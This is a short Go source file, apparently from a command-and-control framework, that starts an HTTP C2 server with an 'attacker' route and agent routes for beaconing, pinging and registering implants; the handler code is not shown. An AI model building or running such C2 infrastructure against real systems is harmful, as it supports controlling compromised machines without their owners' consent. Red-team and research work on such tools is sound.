package c2

import (
	"fmt"
	"log"
	"net/http"

	"server/handlers"
)

func HttpInit(port string) {
	fmt.Printf("[*] - HTTP C2 server listening on port %s...\n", port)

	/* Attacker Routes */
	http.HandleFunc("/command/ping", handlers.PingC2)

	/* Agent Routes */
	http.HandleFunc("/agent/beacon", handlers.Beacon)
	http.HandleFunc("/agent/ping", handlers.Ping)
	http.HandleFunc("/agent/register", handlers.Register)

	// Run server
	var serverPort string = fmt.Sprintf(":%s", port)
	log.Fatal(http.ListenAndServe(serverPort, nil))
}